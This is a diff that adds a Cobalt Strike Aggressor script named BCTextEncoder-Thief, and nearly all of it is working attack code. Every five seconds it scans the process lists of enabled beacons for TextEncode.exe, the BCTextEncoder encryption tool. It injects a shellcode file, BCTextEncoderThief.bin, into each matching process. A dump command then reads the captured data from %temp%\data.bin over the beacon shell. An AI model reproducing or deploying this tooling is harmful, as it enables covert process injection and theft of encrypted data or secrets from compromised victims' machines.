@@ -1,0 +1,70 @@
+@beacons = @();
+@pids = @();
+
+on heartbeat_5s{
+
+		foreach $index => $beaconid (@beacons)
+		{
+		   
+		    bps($beaconid,&handleProcess);
+		}	
+
+}
+
+
+sub handleProcess{
+	
+	$processList = $2;
+	$processName = "TextEncode.exe";
+
+	$start = 0;
+	@tempPids = @();
+	@tempPPids = @();
+	while $index (indexOf($processList, $processName, $start))
+	{
+		$temp = substr($processList,$index,-1);
+		$processInfo = split("\n",$temp)[0];
+		
+		$ppid = split("\t",$processInfo)[1];
+		$pid  = split("\t",$processInfo)[2];
+		$arch = split("\t",$processInfo)[3];
+		
+		if($pid !in @tempPids){
+			add(@tempPids,$pid);
+		}
+
+		if($ppid !in @tempPPids){
+			add(@tempPPids,$ppid);
+		}
+
+		$start = strlen($processInfo) + $index + 1;
+	}
+
+
+	foreach $pid (@tempPids)
+	{
+		if(($pid !in @tempPPids) && ($pid !in @pids)){
+			add(@pids,$pid,0);
+			blog($1,"Injecting into $processName with PID: $pid");
+			bshinject($1, $pid , "x86" ,script_resource("BCTextEncoderThief.bin"));
+		}
+	}
+}
+
+alias bctextencoderthief_enable {
+
+       blog($1, "BCTextEncoder-Thief enabled \n");
+       add(@beacons,$1,0);
+
+}
+
+
+alias bctextencoderthief_disable {
+
+       blog($1, "Disabling BCTextEncoder-Thief");
+       remove(@beacons,$1);
+}
+alias bctextencoderthief_dump {
+	bshell($1,"type %temp%\\data.bin")
+}
+
